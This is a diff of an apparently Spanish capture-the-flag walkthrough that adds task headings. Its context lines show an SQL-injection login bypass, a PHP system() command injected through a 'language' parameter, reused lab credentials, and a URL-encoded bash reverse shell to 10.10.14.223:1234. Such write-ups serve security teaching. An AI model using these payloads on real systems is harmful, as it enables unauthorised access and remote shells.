@@ -257,6 +257,8 @@ GET /index.php?username=%27or+%271%27%3D%271%27--+-&password=%27or+%271%27%3D%27
 
 vemos que hay unn apartado de language suele haber vuln de lfi + path traversal ahí así que probamos
 
+### task 4
+
 <figure><img src="../.gitbook/assets/image (1755).png" alt=""><figcaption></figcaption></figure>
 
 ```
@@ -292,6 +294,8 @@ language=<%3fphp+system("cat+/22b8c7c1b01399ed2aae1bf840acfc74.txt")%3b+%3f>
 <div><figure><img src="../.gitbook/assets/Captura de pantalla 2026-04-11 104947.png" alt=""><figcaption></figcaption></figure> <figure><img src="../.gitbook/assets/Captura de pantalla 2026-04-11 104928.png" alt=""><figcaption></figcaption></figure></div>
 
 Entramos en el **/admin** y reutilizamos las credenciales.
+
+### TASK 7
 
 `pr-martins:martins`
 
@@ -361,6 +365,8 @@ bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.223%2F1234%200%3E%26
 ```
 
 <figure><img src="../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>
+
+### task 8
 
 <figure><img src="../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>
 
